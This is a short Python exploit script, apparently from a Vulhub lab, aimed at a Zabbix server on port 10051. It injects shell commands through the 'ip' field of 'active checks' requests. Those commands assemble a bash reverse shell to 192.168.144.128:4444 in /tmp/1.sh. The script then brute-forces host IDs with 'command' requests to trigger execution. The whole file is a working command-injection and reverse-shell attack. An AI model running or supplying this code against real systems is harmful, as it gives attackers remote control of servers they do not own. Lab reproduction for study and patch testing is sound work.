import sys
import socket
import json
from time import sleep


def send(ip, data):
    conn = socket.create_connection((ip, 10051), 10)
    conn.send(json.dumps(data).encode())
    data = conn.recv(2048)
    conn.close()
    return data


# target = "192.168.144.128"
target = sys.argv[1]
num = 1

exps = [';echo -n "/bin/bash" > /tmp/1.sh', ';echo -n " -i >& " >> /tmp/1.sh', ';echo -n "/dev/tcp/" >> /tmp/1.sh',
        ';echo -n "192.168." >> /tmp/1.sh', ';echo -n "144.128/" >> /tmp/1.sh', ';echo -n "4444 0>&1" >> /tmp/1.sh',
        ';/bin/bash /tmp/1.sh']
for exp in exps:
    host = "vulhub" + str(num)
    print(host)
    print(send(target, {"request": "active checks", "host": host, "ip": exp}))
    sleep(1)
    num += 1

    for i in range(10000, 10500):
        data = send(target, {"request": "command", "scriptid": 1, "hostid": str(i)})
        if data and b'failed' not in data:
            print('hostid: %d' % i)
            print(data)

